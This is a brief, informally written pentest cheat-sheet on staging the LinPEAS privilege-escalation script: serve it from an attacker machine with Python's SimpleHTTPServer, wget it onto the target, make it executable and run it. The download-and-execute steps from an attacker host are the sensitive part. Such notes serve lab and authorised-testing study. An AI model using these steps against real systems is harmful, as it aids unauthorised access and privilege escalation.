1) Linpeas.sh
need to download to target machine for this file
Step 1: first download the attacker machine for this file
Step 2: After start simple server
cmd: python -m SimpleHTTPServer
Step 3: open to the target machine download the file
cmd: wget http://ip/linpeas.sh
Step 4: After download give to permission
cmd : chmod +x linpeas.sh
Step 5 after run the file
cmd: ./linpeas.sh
